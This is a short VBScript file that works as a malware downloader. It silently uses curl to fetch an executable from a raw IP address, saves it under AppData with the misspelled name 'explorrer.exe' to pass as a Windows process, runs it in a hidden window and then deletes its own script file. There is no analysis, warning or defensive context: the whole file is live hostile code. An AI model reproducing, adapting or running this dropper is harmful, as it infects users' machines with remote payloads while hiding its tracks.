Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
fileName = "explorrer.exe"
downloadLink = "62.60.248.166/ex.exe"
WshShell.Run "cmd /c curl -k -s -o %USERPROFILE%\AppData\Roaming\Microsoft\" & fileName & " " & downloadLink & " && start %USERPROFILE%\AppData\Roaming\Microsoft\" & fileName & "", 0, False
fso.DeleteFile WScript.ScriptFullName
